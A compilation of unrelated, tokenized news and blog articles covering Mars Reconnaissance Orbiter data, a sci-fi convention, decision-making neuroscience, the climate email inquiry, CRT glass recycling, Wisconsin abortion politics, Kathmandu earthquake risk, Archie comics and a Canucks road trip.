The data generated by the Mars ReconnaissanceOrbiter has generated is also more than three times the amount of data fromall other deep - space missions combined ?
not just the ones to Mars , but everymission that has flown past the orbit of Earth 's moon .
But the amount of data is n't the only thing impressive aboutthe mission 's achievement .
" What is most impressive about all these data is notthe sheer quantity , but the quality of what they tell us about our neighbor planet , " said MRO project scientist Rich Zurek , of NASA 's Jet Propulsion Laboratory , Pasadena , Calif .
" The data from the orbiter 's six instruments have givenus a much deeper understanding of the diversity of environments on Mars todayand how they have changed over time . "
The spacecraft entered orbit around Mars in March 2006 , following an Aug. 12 , 2005 , launch from Florida .
It completed its primaryscience phase in 2008 and continues investigations of Mars ' surface , subsurfaceand atmosphere .
After a series of glitches forced mission managers to putthe spacecraft into safe mode last year , MROwas resurrected in December .
MRO 's antenna can beam data to Earth at a rate of up to 6 megabits per second .
The capability to return enormous volumes of data enables MRO ' sinstruments to view Mars at unprecedented spatial resolutions .
Half theplanet has been covered at 20 feet ( 6 meters ) per pixel , and nearly 1 percentof the planet has been observed at about 1 foot ( 30 centimeters ) per pixel , sharp enough to discern objects the size of a desk .
Among the mission 's major findings is that the action ofwater on and near the surface of Mars occurred for hundreds of millions ofyears .
This activity was at least regional and possibly global in extent , though possibly intermittent .
The spacecraft has also observed that signatures of a varietyof watery environments , some acidic , some alkaline , increase the possibilitythat there are places on Mars that could reveal evidence of past life , if itever existed .

Convention season is quickly approaching .
We 're even getting in high gear already for Vegas Con , but there is one convention we would love to visit .
Shore Leave 32 is set for July 9 - 11 , 2010 and is known to be one of the biggest fan run conventions on the giant blue marble .
This year 's guest list is already starting to shape up .
Our buddy Miles McLoughlin from the SciFi Diner Podcast reminded us about the update .
Thanks Miles !
So far we have two of our Trek family showing up to Shore Leave 32 .
Dominic Keating from the NX - 01 will be attending as well as whale loving Dr. Gillian Taylor ( Catherine Hicks ) from Star Trek IV : The Voyage Home .
Other stars in attendance : Edward James Olmos & Katee Sackhoff from Battlestar Galactica , Torri Higginson & Bill Dow from the Stargate franchise , and Kevin Sorbo from Hercules : The Legendary Journeys ' & Andromeda .
Be sure to check Miles 's report from last years Shore Leave 31 here .

A new study from the Proceedings of the National Academy of Sciences confirms what many confused shoppers , dieters , and investors know first - hand : when a decision is difficult , we go with the status quo or choose to do nothing .

Ahem .
Back to the science : Researchers from the Wellcome Trust Centre for Neuroimaging at University College London created a computerized task .
Participants viewed a series of visual tests that asked them to play a referee making a sports call ( e. . , whether a tennis ball bounced in our out of bounds ) .
Before each test , participants were told that one of the responses ( in or out ) was the " default " for this round .
They were asked to hold down a key while they watched .
If they continued to hold down the key , they were choosing the default .
If they lifted their finger , they were choosing the non-default .
Importantly , the default response ( in or out ) switched randomly between rounds , so that a participant 's response ( to make a call in or out ) would not be confused with their tendency to stick with the status quo .
The researchers were interested in two questions :
1 ) Does the difficulty of the decision influence the participants ' likelihood of choosing the default ?
2 ) Is there a signature for choosing the default vs. overriding the status quo ?
As my shopping habits ( and the researchers ) predicted , participants were more likely to stick with the default when the decision was difficult .
It did n't matter whether the default was in or out .
If they could n't make a confident choice , they essentially chose to do nothing .
And as the researchers point out , this tendency led to more errors .
What was happening in the participants ' brains as they chose ?
The researchers observed an interesting pattern when participants went against the default in a difficult decision .
There was increased activity in , and increased connectivity between , two regions : the prefrontal cortex ( PFC ) and an area of the midbrain called the subthalamic nucleus ( STN ) .
The PFC is well - known to be involved in decision - making and .
The STN is thought to be important for motivating action .
The researcher 's analyses could n't determine for sure what the relationship between the PFC and STN was , but the observations were consistent with the idea that the PFC was driving , or boosting , activity in the STN .
These brain analyses suggest that going against the default in difficult decisions requires some kind of extra or .
Otherwise , the decider in our mind is puzzled , and the doer in our mind is paralyzed .
Knowing this can help explain why changing habits can be so difficult .
If you are n't sure why you 're changing , do n't fully believe you 're making the right choice , or question whether what you 're doing will work , you 're likely to settle back on your automatic behaviors .
That 's why - the belief that you can make a change and overcome obstacles - is one of the best predictors of successful change .
The decider and the doer need a boost of confidence .
It also helps explain why we love formulaic diets , investment strategies , and other decision aids .
Formulas feel scientific , tested , and promising .
They also give us a new default .
We can rely on the rules ( no eating after 7 PM , automatically invest X % of your income in mutual funds twice a month ) when we 're feeling overwhelmed .
A new automatic makes change much easier .
( For more on this idea , see " The Self - Control Costs of Flexibility . " )
So next time you 're trying to make a change , figure out what your current default is , and remind yourself exactly why it is n't working .
Then look for ways to change your default ( clean out your fridge , set up direct deposit ) so you do n't have to fight the old default as often .
And feel free to be your own cheerleader when the going gets rough .
Look for the first evidence ( a pound lost here , a dwindling credit card statement there ) that what you 're doing is paying off .
The status quo is seductive , and we all need a little encouragement to lift our fingers off the keyboard .

Gaunt , beta - blocked and stood down from duty , Phil Jones is the fall guy for the wider failings that triggered the hacked climate email scandals .
But at its hearings into the affair a month ago , the Commons science committee was kind to the director of the Climate Research Unit ( CRU ) , but short - tempered with his grinning sidekick , the University of East Anglia 's vice - chancellor Edward Acton .
And so , in their report , Jones gets the benefit of a few doubts .
At their final drafting meeting last week , only the MPs ' in - house cryptosceptic , Graham Stringer , voted against a sentence saying that , on the evidence they had , " the scientific reputation of Professor Jones and CRU remains intact " .
Instead , the university administration gets chastised for presiding over a culture of secrecy and possible illegality within the CRU that led to a public relations meltdown .
The MPs are clear that there are serious issues to address both in climate science and in the operation of freedom of information law in British universities .
But in their desire not to single out Jones , they end up bending over backwards to support a man who is the pillar of the establishment they are criticising .
Of course , it must have been " frustrating " for Jones to handle freedom of information requests from people " he knew – or perceived – were motivated by a desire simply to undermine his work " .
But , as the MPs say , his " blunt refusals to share data , even unrestricted data " led to " unfortunate email exchanges " and was " inevitably counterproductive " .
The MPs are right to absolve Jones of many of the crimes of which bloggers have accused him .
The allegations surrounding his " tricks " and efforts to " hide the decline " are largely malicious inventions .
But , in their rush to judgment before parliament is dissolved for the general election , Phil Willis and his team avoided examining more complex charges , including those raised by the Guardian in its investigations in February .
Even so , they sometimes get confused .
The MPs accept Jones 's claim that CRU 's habit of keeping secret much of its data , methodology and computer codes was " standard practice " among climate scientists .
Yet they also note that Nasa scientists doing similar work are much more open .
Not so standard , then .
And whatever standard practice may be , surely as one of climate science 's senior figures , Jones should take some responsibility for its misdemeanours ?
Jones has worked for the CRU for more than 20 years and been its director for six .
The MPs found there a " culture of withholding information " in which " information may have been deleted to avoid disclosure . "
It found this " unacceptable " .
Does n't its director take responsibility ?
The MPs kept their criticism for the university .
Its " failure to grasp fully the potential damage [ from ] non-disclosure of FOIA requests was regrettable " .
Also possibly illegal , it might have added .
UEA is rightly in deep doo - doo .
The MPs find that its information officers colluded with CRU to subvert legitimate freedom of information requests , and " found ways to support " the culture of secrecy .
In a key statement that not even the proliferation of acronyms can disguise , they say : " We must put on record our concern about the manner in which UEA allowed CRU to handle FOIA requests . "
The wider research community also has questions to answer .
" We recommend that all publicly funded research groups consider whether they are being as open as they can be , and ought to be , with the details of their methodologies , " the MPs say .
That sounds like a good follow - up for the committee after the general election .
But apart from Acton , the person who will read this report with most gloom , may be Sir Muir Russell , the Scottish grandee appointed by Acton to review the activities of Jones and his colleagues .
The MPs agree with the sceptic Lord Lawson , who gave evidence , that Russell 's inquiry should conduct his interviews and hearings " in public wherever possible " .
Unless Russell has spoken to nobody in the past four months , he evidently is not doing that .
They say his inquiry should " publish all written evidence on its website as soon as possible " .
Yesterday , a month after the deadline for submissions closed , none had been posted .
Worse , the MPs have given him long list of things to investigate or rule on , such as deciding whether emails were deleted in breach of FOI law .
Or coming up with rules for CRU on sharing data .
And such as deciding whether Jones " subverted the peer - review process " .
They also suggest that a test of how truly independent the Russell inquiry is will be whether it gives the UEA an advance copy .
This story is far from over yet .
Many people may assume that conventional television sets and computer monitors — the kind that use picture tubes ( technically known as cathode ray tubes , or CRTs ) rather than flat panel screens — have virtually disappeared from the market , like buggy whips and 8 - track cassette tapes .
But a new MIT study reports that demand for these devices is still greater than the supply of old discarded CRTs , whose glass is recycled to make new ones .
The demand comes mostly from the world ’s developing nations , where inexpensive TV sets using CRTs are one of the first luxury items people tend to buy as soon as they have a little bit of disposable income .
CRT television sets “ are still absolutely the cheapest way to get a first TV , ” says Randolph Kirchain PhD ’99 , associate professor of materials science and engineering and engineering systems and co-author of the new study .
“ That ’s an early purchase one makes as one moves up the income ladder . ”
Sales of CRT television sets peaked in 2005 at about 130 million units worldwide , and declined to about 90 million last year — almost all of those in Asia and Latin America , where sales stayed roughly constant and are expected to remain so for several years .
Virtually all of these CRTs are now manufactured in Asia .
Sales of CRT computer monitors peaked around 2000 at about 90 million units , but have already declined to near zero .
Because the glass used in CRTs contains a substantial amount of lead — used to block X - rays produced by the tube ’s cathode ray gun to keep them from posing a health risk to viewers — the old tubes can potentially pose risks to human health if simply dumped in landfills .
In some places , including most European nations and Japan , they are included in a category of electronics waste that must be properly recycled , but recycling requirements in the United States and most of the rest of the world are inconsistent , or nonexistent .
As a result , the study found that in terms of recycling glass from old CRTs to make new ones , “ the amount of new glass required is decreasing , but is much greater than the amount of secondary glass collected , which is increasing . ”
That balance , the authors found , “ is sustainable for the foreseeable future . ”
In other words , manufacturers wanting to use the recycled glass can count on having a supply , and recyclers can count on finding a market for the old tubes , for many years to come .
Kirchain says the study was partly an attempt to develop a more general method for analyzing the flow of materials through the whole chain of production , use and disposal or recycling .
“ Our interest is in understanding how to make a materials system function in a healthy manner , ” he explains , “ both for economic benefits , and to minimize the environmental burden .
We saw this as an interesting test case , ” partly because it deals with a commodity that is gradually being phased out .
“ We wanted to see how materials systems evolve over time . ”
The biggest issue in recycling CRTs is the imbalance in the centers of supply and demand .
Most of the old CRTs being disposed of are in the United States and Europe , whereas the greatest demand for the material for making new CRTs is in Asia .
But because glass is a low - value commodity , “ the farther you have to move it , the less likely it is that the market drives the transaction , ” Kirchain says .
Fortunately , there is one other use for the recycled glass — as an additive in smelters used to produce metals .
“ Any kind of smelter will use silica [ the main ingredient in glass ] as a flux , to separate out anything in the mix they do n’t want , ” says Jeremy Gregory SM ’00 , PhD ’04 , a research scientist in MIT ’s Materials Systems Laboratory and lead author of the new study , published in the December issue of the journal Environmental Science and Technology .
In some smelters , he says , the operators are willing to use old CRT glass as a flux material , although they generally charge the suppliers for taking it off their hands .
If the plant is producing lead , the lead - laced glass can actually add to the lead produced , although the amount is very small , he says .
In Europe , with its strict regulations requiring electronics waste recycling , CRTs represent by far the biggest category of such material being collected , though e-waste is only 1 to 2 percent of the overall waste stream .
But because of its lead content , it is one that merits attention , Kirchain and Gregory say , especially since much of it gets shipped from the industrialized world to developing countries where there are fewer regulations regarding its disposal and the protection of people exposed to it .
Ruediger Kuehr , head of the operational unit at the United Nations University ’s Institute for Sustainability and Peace , says that this academic study can provide important advice for both industry and government regulators because “ those entities are often focused on short - term and short - sighted issues , and do not have the luxury of taking a broad systems - wide , hence holistic , view of an issue . ”
He says this study is “ quite useful in considering what should be done with all of the materials that are a byproduct from recycling , particularly when it is not clear there is demand for the recycled materials . ”
The study , Kirchain says , underscores the need for manufacturers to consider the full lifecycle of a product and try to plan ahead for recycling and repurposing of devices that have outlived their original function .
Such issues will continue to gain urgency , he says , as new products enter the market , for example the vast number of new batteries that would be required for a major shift toward electric vehicles .
“ There ’s a lot of interest in driving the new technologies , ” he says , “ and very little in finding something useful to do with them at the end of their life . ”
As I 've mentioned before , I 'm often struck by profound nostalgia for the Toronto of the 1970s and 80s .
Without getting overly self - analytical , this is no doubt a manifestation of my ( false ) belief that things must have been easier or better when I was a youngster .
Despite my efforts to remain critically vigilant against the seduction of nostalgia , I often cave in and indulge the desire to go " home " again .
Sometimes an episode of Degrassi Junior High or early Street Legal will do it .
But , being a lover of photography , it 's old images of the city that really drive my crank .
For the past little bit , I 've been cruising the threads at Urban Toronto to get my fill of archival photographs .
But , having exhausted this source , I decided that a bit more searching was in order .
Enter the Wikimedia Commons .
Once one starts blogging , a certain vanity compels him to share much of his interests and pursuits with others who he presumes are interested .
So instead of just perusing the Commons for my own viewing pleasure , I decided that I would post my findings .
So , allow me to present a few of the images that I liked .
The pool of 70s and 80s stuff is actually pretty small at the Commons , so I 'll be looking to find more of this content in the near future .
Enjoy !

There 's nothing like homegrown vegetables , and there 's no vegetable easier to grow than one that regenerates itself .
With the help of a guide from DIY web site Instructables , you can now grow a bevy of onions from just one old onion bottom .
Onions are great .
They not only provide flavor to many a dish , but they can also clean your grill and soothe bee stings — so there 's no reason not to have a full bed growing in your kitchen at all times .
All you need for this trick is an onion , a knife , and a cutting board — things you probably already have if you 're cooking with onions ( if not , I 'm very curious as to how you are cooking with onions ) .
You 'll also need some dirt — of which this planet has a pretty plentiful supply — and , if you choose to do so inside , some pots , although you can plant your onions directly in the ground if you prefer .

The process is extremely easy , and really just involves putting an old onion bottom in the ground and letting it regenerate its roots — after which you remove the old onion and let those roots grow .
You can also separate the roots to create new plants and they will regenerate themselves — theoretically giving you an infinite supply of onions .
If you 're going to overflow your kitchen with onions , though , be sure you know how to slice them like a pro and keep those tears at bay — we want to make sure the blood , sweat and tears going into your food is purely figurative .

It 's winter in Wisconsin , but despite the plunge in temperatures , the friction between pro-choice and anti-abortion activists heats up more each day .
The battle is being fought on multiple fronts : against Planned Parenthood , against Young Catholics for Choice ( YCFC ) , against college students , against high school students and even against the state itself .
Each new assault makes one thing abundantly clear : Pro-Life Wisconsin and their other anti-choice allies in the state are using every means they can to cut young people off from access to reproductive health care .
In recent weeks , we 've been following Human Life Alliance and their Icare advertising supplements being distributed on college campuses across the country .
As we noted , these advertisements carry misleading information on contraception , pregnancy , and abortion .
But staffers at some college papers are fighting back .
The Advance - Titan , the student newspaper at the University of Wisconsin at Oshkosh , said " no thanks " to carrying the misleading ad supplement .
According to the Milwaukee Journal Sentinel :
Virginia Zignego , a spokeswoman for Pro-Life Wisconsin , says the Advance - Titan 's decision to reject the advertisement demonstrates its bias and amounts to censorship .
The newspaper 's faculty adviser , Vince Filak , says the paper 's decision was fully discussed .
He calls it the perfect Catch - 22 because accepting the ad would have upset people , too .
Unfortunately , newspapers at four other campuses in the state have either run or plan to run the supplement which , among other things , tells rape victims they cannot heal unless they give birth to their attackers ' babies .
Pro-Life Wisconsin is familiar with injecting themselves into campus issues .
They 're in a dispute with Young Catholics for Choice ( YCFC ) , a group affiliated with the national organization , Catholics for Choice .
YCFC has launched a campaign to make Emergency Contraception ( EC ) more accessible to women at colleges and universities in Wisconsin .
According to Express Milwaukee :
The group stressed that emergency contraception — or the " morning - after pill " — is not an abortion pill , because it prevents a pregnancy from occurring if taken within a 72 - hour window after unprotected sex .
EC does not terminate an existing pregnancy .
" [ Emergency contraception pills ] are not effective once the process of implantation has begun , and will not cause abortion , " states the World Health Organization fact sheet on emergency contraception .
Catholics for Choice and Family Planning Health Services of Wisconsin have developed a TV ad and radio ads to stress the need for women to have EC on hand just in case they need it .
" As a Catholic , I need to follow my conscience , " the ad concludes .
YCFC states that its views are the same as a majority of mainstream Catholics , stating that " 90 % of American Catholic women have rejected the church ’s ban on modern contraception , and they should continue to make decisions based on their ' informed conscience . ' "
That other 10 % is apparently made up of the members of Pro-Life Wisconsin , and they want to make sure they are heard .
A Pro-Life Wisconsin press release on the matter states :
" As a young Catholic myself , Young Catholics for Choice does not speak for me , " said Virginia Zignego , communications director of Pro-Life Wisconsin .
" The Catholic Church clearly opposes contraception and abortion .
It is unfortunate that Catholics for Choice are using the label ‘ Catholic ’ to push their agenda and normalize risky sexual behavior . "
According to the Milwaukee Journal - Sentinel , soon - to - be Milwaukee Bishop Jerome E. Listecki has also made himself clear on the debate , stating that the YCFC are not Catholics due to their renegade stance on birth control .
He does not weigh in on whether the rest of the 90 % of Catholics who believe birth control is not a sin are also " disown[ing ] their Catholic heritage . "
It comes as no surprise to learn that Listecki was one of two Wisconsin bishops in 2008 to oppose requiring hospital to provide EC to rape victims ( the other bishops all remained neutral ) .
Pro-Life Wisconsin is n't just focused on the college campuses , but high schools as well .
The easiest way to prevent pregnancy is to have accessible birth control available to those engaged in or considering having sex .
Based on public health evidence , the school board in Milwaukee unanimously approved allowing nurses in high schools across the district to hand out condoms to students that request them .
The Journal - Sentinel reports that :
In proposing the program , the school district said a 2009 study found that nearly 63 % of Milwaukee Public School high school students were sexually active , and that nearly one - third of those students had not used a condom the last time they had sexual intercourse .
Also cited were figures that rate Milwaukee high among U.S. cities in births to teen mothers and " particularly high " in the incidence of certain sexually transmitted diseases .
The district noted that its sex education policy takes an abstinence - based approach to reducing the risk of communicable diseases .
And it says research shows that students are more likely to use condoms if they are available in schools but no more likely to be sexually active .
Of course , Pro-Life Wisconsin objects to that , as well .
" High schools should be in the business of facilitating academic excellence - NOT moral decadence .
Handing out condoms in schools serves only to aggravate the problem of increased teen sexual activity by sanctioning and therefore , encouraging it .
Sexual promiscuity diverts teens ’ attention away from their critically important school work .
Such a counter intuitive and counter productive approach harms not only the physical health of our youth , but also their emotional , psychological and spiritual health as well . "
You would think that with all of this protesting , obstructing and misleading that Pro-Life Wisconsin would be too busy to do much more .
But they appear to have endless energy .
Their final year end assault is on a local Planned Parenthood in Wisconsin , accusing them of not providing accurate medical information to women seeking abortions .
The accusation is levied by an undercover video taken as part of the Lila Rose Project Live Action .
The video , which is an edited piece without a great deal of background context , is being touted as a sign that the family planning clinic is not adhering to the law in providing scientifically accurate information .
Pro-Life Wisconsin states in their press release :
" Planned Parenthood of Wisconsin is the state ’s number one abortion provider , both surgical and chemical .
Planned Parenthood has proven they do not know , or they care to ignore , basic facts about human development , " said Peggy Hamill , state director of Pro-Life Wisconsin .
" Our affiliates have prayed and sidewalk counseled at this location for years , and we have seen firsthand the damage caused by this abortion facility . "
The group uses the video to try and cut the clinic 's funding for family planning services , such as birth control , as well as the file complaints against the center .
The unspoken desire is also to scare doctors with threats of having their medical licenses revoked , in an attempt to have less people as practitioners .
Less practitioners , as always , means less access for all women .
As if they were n't battling on enough fronts , the anti-choice faction has one more foe to face : the state of Wisconsin .
The state legislature in November passed a new law mandating that insurers must cover birth control as part of their coverage .
The move makes Wisconsin the 25th state to mandate coverage , and took effect on January 1st .
But the Wisconsin Catholic Conference is demanding an exemption from the new law , citing religious freedoms .
According to the Watertown Daily Times :
There was opposition from anti-abortion and Catholic groups to requiring contraceptives to be covered under health insurance policies .
Opponents argued that birth control is not medically necessary and insurance companies should not be forced to pay for what is a personal decision .
The Wisconsin Catholic Conference is lobbying lawmakers to provide an exemption for religious organizations .
" The law does not give adequate deference to our religious values and our religious liberties , " said John Huebscher , executive director of the conference .
" It would force dioceses and other Catholic organizations that buy insurance to pay for something they object to . "
There is no word on whether the Conference also wants an exemption for Viagra , plastic surgery , or other " personal decision " medical interventions , nor whether they would consider allowing birth control for those who are prescribed it for medical reasons other than preventing pregnancies .
The rhetoric , tactics and debate seem to be ramping up .
What will 2010 bring to the state of Wisconsin ?
We will be tracking it all year , and are as anxious to find out as you are .
KATHMANDU , Nepal —
When disaster specialist Amod Dixit looks out his window in Kathmandu , he sees collapsed bridges , demolished hospitals , schools reduced to rubble and dusty corpses lying in the street , the nightmare of Port - au - Prince revisited on his Himalayan home .
“ Unfortunately , that is the reality ( of what we are facing ) , if not worse , ” said Dixit .
“ If Kathmandu is impacted with a shaking of an intensity IX on the Mercalli intensity scale , the aftermath is going to be much worse than in Haiti . ”
Unlike the more commonly known
Richter scale , which measures the magnitude of an earthquake at its epicenter , the Mercalli scale measures the intensity of shaking in specific locations — basically by measuring the destruction of buildings and natural structures .
Dixit has every reason to be worried .
The climax of the collision between tectonic plates that thrust up the Himalayas , Nepal is criss - crossed by geologic fault lines — some of which have been building up pressure for centuries .
Even if it happens 185 miles away , an earthquake that measures 6 or 7 in magnitude on the Richter scale at its epicenter could generate level VIII , IX or even X level shaking on the Mercalli scale in Kathmandu .
In other words , many believe Kathmandu is overdue for more devastating shaking than the IX level disaster that flattened Haiti this January .
The last time a quake like that struck here , in 1934 , a quarter of all the homes in the country were destroyed , dozens of revered ancient monuments collapsed and more than 20,000 people lost their lives .
The next “ big one ” could be much worse — especially here in the Kathmandu Valley , a bowl that will trap and amplify the wave of energy .
“ Chile has had a huge magnitude earthquake in the past , and as a medium income country it has the resources and institutions in place that have built earthquake - resistant housing and infrastructure , ” said Saurabh Dani , disaster management specialist for the World Bank 's South Asia team .
“ Haiti and Nepal are both low income countries , with poor building standards , ( and ) even if the magnitude of the earthquake is less than the one in Chile , the impact in loss of life would be catastrophic . ”
Since 1997 , the population of the Kathmandu Valley has doubled , from about 1.5 million people to more than 3 million .
Of more serious concern , the population density has also increased dramatically .
Each year , between 10,000 and 20,000 new buildings mushroom , most of them constructed with little more than a wink and a nod to the building code , with higher floors built off the books , concrete watered down to save on material , structural columns eliminated and emergency exits ignored .
When the big one comes , two - thirds of them will collapse , and the casualty rate will be high .
“ The density of the population in each household has seen dramatic growth , so the lethality of the earthquake will be much higher ( than we once expected ) , ” said Dixit .
“ Our estimate ( of 10 years ago ) of 40,000 dead and 100,000 people injured and requiring hospitalization could easily be doubled — or make it two - and - a - half times or three times . ”
And that 's only the beginning .
Unlike Haiti , Nepal is a landlocked country , with the high peaks of the Himalayas separating it from neighbors , like India and China , that could aid in relief efforts .
The only lifeline for supplies and rescue teams for Kathmandu will likely be the small , single - runway airport .
And there are no guarantees that its air traffic control system , or its water , electricity and fuel supply will survive the first wave of tremors .
“ There is no emergency response plan for the airport , ” said Dixit .
“ There 's a plan for emergency landings , but I 've not seen or been told about any earthquake emergency contingency plan for airport operation . ”
As witnessed in Haiti , managing the relief effort for a disaster on the scale of the one expected here presents a tremendous challenge — even with the U.S. military 's Southern Command only 700 miles away in Miami .
The conventional wisdom is that rescuers have just 72 hours to pull people out of the rubble , after which any survivor is considered a fluke .
And despite the herculean efforts deployed in Port - au - Prince , relief workers were only able to save about 130 people from among a hundred thousand who were buried alive .
The answer clearly lies in prevention — or mitigation — rather than rescue .
There , too , Nepal 's situation is grim .
“ My preoccupation is how do we reduce the number of people we have to extract from the rubble , ” said Robert Piper , the head of the United Nations ' humanitarian effort in Nepal .
“ That 's the mitigation measures , and that 's where our preparedness is nothing short of pathetic . ”
Piper is one of the driving forces behind a pioneering effort to change that .
Bringing together a consortium including the U.N. , the Red Cross , the Asian Development Bank and the World Bank , the $ 130 million project aims simultaneously to ramp up Nepal 's ability to respond to a major earthquake and mitigate its effects by improving the structures of schools and hospitals — potentially saving hundreds of thousands of lives .
“ It 's not going to save every life , ” said Piper .
“ We ca n't retrofit every building in the Kathmandu Valley .
But if we retrofit all the schools , if we fix the hospitals , if we shift the bridges , if we put water sources in where people are going to be evacuated ... we 're going to have an impact . ”
It 's Dixit 's NSET that 's shown the way forward , or at least the first step .
Realizing that demolishing and rebuilding 32,000 public schools would be impossible for a country with a per capita income of less than $ 500 , the local organization has shown that it 's feasible to retrofit schools to prevent loss of life — if not always the loss of the building — for as little as $ 30,000 .
And in outlying areas where costs escalate dramatically for concrete and rebar , almost any material , including traditional adobe , can be adapted to earthquake - safe designs .
So far NSET has retrofitted some 200 schools , providing a strong proof of concept .
Dixit says that over the last decade , NSET has shown that preparing for disaster is not as costly as once imagined , that the knowledge and technology to make a difference is available , and developing countries do n't have to be distressed that only rich nations can afford safety .
But proving that is far from enough .
“ Our school program is very famous , and everybody likes it , and we have been invited to other countries to talk about it , but there 's a tremendous sense of guilt with us that we have only been able to go out to 200 schools , ” said Dixit .
“ That is a gloomy picture . ”
Even for stopgap measures like retrofitting , the challenges are enormous .
Awareness of the risks is high , but poor people are still inclined to cut corners to save construction costs .
Kathmandu has no mayor to ride herd on building inspectors , fire chiefs and other officials responsible for making the city safe .
And national politicians — notoriously reluctant to focus on issues that wo n't gain them any political capital until years down the road , if at all — are now wrapped up in a complex peace process following a decade - long civil war .
So although everyone knows that if the big one were to hit tomorrow , the loss of life would be nothing short of catastrophic , in Dixit 's words it 's up to the banks , the ambassadors and the U.N. to take up the baton now .
“ It 's a crime not to have an earthquake resistant building in Kathmandu .
It 's a gross crime , ” said Dixit .
Looking through Previews this month , we spotted the solicitation for " Archie " # 608 , where everyone 's favorite teen is on the cover kissing Valerie Brown from " Josie and the Pussycats , " and while that might seem pretty tame to anyone who does n't spend a great deal of time obsessing over Riverdale and its residents ...
... this is actually a pretty big deal .
How big ?
Well , in an essay on his website , comics writer Dwayne McDuffie relates a story of an irate reaction by the Archie editors at a story of interracial dating in " Betty and Me " back in 1992 .
According to McDuffie , writer Matt Wayne wanted to add some tension to the series by starting another love triangle , this time with Betty as the focus , being fought over by Archie and a new character , Dexter .
Archie and Dexter would become friendly rivals in the same way that Betty and Veronica were , with the added benefit that the stories would actually be about Betty .
The problem ?
Dexter was black .
And as McDuffie relates ...
Darryl called Matt with the bad news .
[ The editor ] had literally thrown the issue at him .
He hated the stuff , wanting to know why Dexter was so much more accomplished than Archie , " What is he , super - Negro ? " ( at least , " Negro " is what everyone who told me this story reported him as saying .
I have a sneaking suspicion that they were trying to save my feelings ) .
Darryl was very upset and told off his boss , but to no avail .
He was ordered to change the story in the cheapest way possible : Dexter was to be re-colored white .
And that 's not the last time it happened , either .
As recently as 2008 -- 2008 ! -- a " Dating Game " style story - arc in " Betty and Veronica Double Digest " saw Cheryl Blossom hooked up with new characters , with readers voting on which one she should stick with .
One of the potential love interests , Brandon , a character that was clearly black in the solicitations , show up with a much lighter skin tone in the actual issues :
The common thread here , of course , is that they were both black characters built as love interests for white girls .
To their credit , Archie has ramped up their efforts at adding a little diversity to the formerly gentrified Riverdale , especially recently .
The last few years have seen the introduction of characters like Raj Patel , Kimiko , Tomoko , and even more featured roles for older characters like Ginger Lopez and starring roles for the core cast 's original black character , Chuck Clayton :
Are these characters one - dimensional ?
Well , yes , but they 're one - dimensional in the way that all Archie characters are , like Raj , who is frequently described as -- wait for it -- " out - Raj - eous . "
He 's defined by one thing -- in this case , his aspirations as an amateur filmmaker -- but no more than Archie , who 's defined by being a girl - crazy klutz .
It 's a reduction of a character to one note , but it 's a rare case of that one note being completely unrelated to their race .
Of course , our favorite subtle example of racial aspects of Riverdale comes in a story where Archie , deciding he wants to learn more about manga , just automatically assumes that his Japanese - American classmate Tomoko will have the answers , only to find out that she and her parents are Riverdale natives , her family having emigrated three generations back , and Tomoko could not be less into comics .
It 's a small part of the story , but it 's a subtle way for Archie to learn a lesson about how making even " good - natured " assumptions about people based on race is not a great way to go .
Then again , any illusions of progress were shattered by the fact that the Tomoko story hit shelves before Brandon 's whitewashing .
This , however , is a different matter .
Yes , it 's Archie kissing Valerie , which certainly plays into fears of miscegenation far less than having a black boy with a white girl , but the fact remains that they 've put it on the cover .
And unlike Brandon and Dexter , two new characters that readers were n't familiar with , Val 's the longest - running black character the company has , making her first appearance way back in 1969 .
In selling the issue with that image , they 've essentially locked themselves out of a change , short of something drastic that would involve re-lettering the whole story to make it about Melody , which at this point would be pretty noticeable .
So does it make up for Brandon and Dexter ?
No .
But it is a step in the right direction , and we 're glad to see that there 's progress , even if -- like everything else in Riverdale -- it 's moving a heck of a lot slower than everywhere else .
It was long and it was arduous .
Hours , days and weeks blended together ; games melted into one another , goals , saves and fights became a way of life .
The Vancouver Canucks ' NHL - record 14 - game road trip had a bit of everything -- mountainous highs and flat - lining lows .
The Canucks made the best of most situations and rallied around each other to come back from six third - period deficits .
A .500 record was the goal , an 8 - 5 - 1 record was the result -- making this a road trip worthy of a closer look .
Here 's what the Canucks will remember as the best of the best from the longest road trip ever .
" I think Colorado ( 6 - 4 on March 9 ) , that was a good one just because we were down and we 're battling right now as it is and we 're two teams that do n't like each other really so I like the way we won that one for sure .
Guys were pretty happy after that one , but at the same time we realized that we can't keep putting ourselves in a situation to have to come back like that .
" " For sure in Colorado .
Down 3 - 0 and we make it 3 - 1 and then they make it 4 - 1 the next shift .
To come back from that was a pretty good feeling , it kind of pushed us over the top and made the road trip a lot better than if we had lost .
" During the game we knew we just had to settle down and we knew that we could come back because we 'd done it before .
Afterwards it was just a great feeling , whenever you come back from three goals and squeak it out right at the end , it 's a great feeling .
" " The ( Sedin ) twins had a nice one in Toronto , but that was so long ago now , there 's got to be a nicer one than that .
( Mikael ) Samuelsson and the twins had a few nice ones in Colorado . …
I 'd have to say in Columbus , Mason Raymond backdoor to Kyle Wellwood , that was a nice pass ; we 'll go with that one . "
" I think you 've got to go with Jannik ( Hansen ) 's in Colorado .
It was a big win for us , that was to fend them off for first place in the division and it was just a huge goal from a guy who has n't been playing much so it was nice to see him get some success .
We were all over him afterwards ; he 's got three game - winners now this year and he 's maybe second or third on the team , so it 's pretty special . " " Detroit .
Hometown .
Home crowd . " " Chicago .
I 've got some buddies from school there so it was nice to see them and Chicago is a great town .
We had some time to do a little shopping , walk up and down Michigan Ave , so it was nice .
" Then the atmosphere at the game was incredible .
Those people cheering during the anthem really gets you going .
We would have liked to come out better in that one , but it was definitely a playoff atmosphere in that building . " " Chicago , because we stay right downtown there , there 's Michigan Ave. , where we did a lot of shopping and the weather was nice and there 's just lots of people around .
We got a few fans coming at us at the hotel and around the restaurants , but normally I try to put a hat and hoodie on and I mind my own business . " " Throughout the whole trip there were a lot of places where quite a few fans were with us .
Early on at the start it was Toronto and Montreal , then in the second half here I 'd say Nashville was great and Phoenix had some going there , even in Colorado there were a few .
There were n't too many in Chicago , that 's for sure . " " Phoenix .
I thought we were at home there . " " Phoenix is incredible .
We would score and it felt like we were at a home game , it was awesome .
Lots of kids asking for autographs standing outside in the sun there , it 's nice , people get down there for a vacation and they take in a Canucks game . "
" I 'm fortunate enough to be a pretty good sleeper , but in Colorado it was the best .
You open the windows and get some of that fresh air and you get a view of the mountains and it 's just such peaceful scenery .
That 's a city anyone can have a good night 's sleep in . "
" I 'd have to go with ' Hurt Locker , ' it was probably the best one I saw , and the worst was the ' Invention of Lying , ' that 's a really terrible movie .
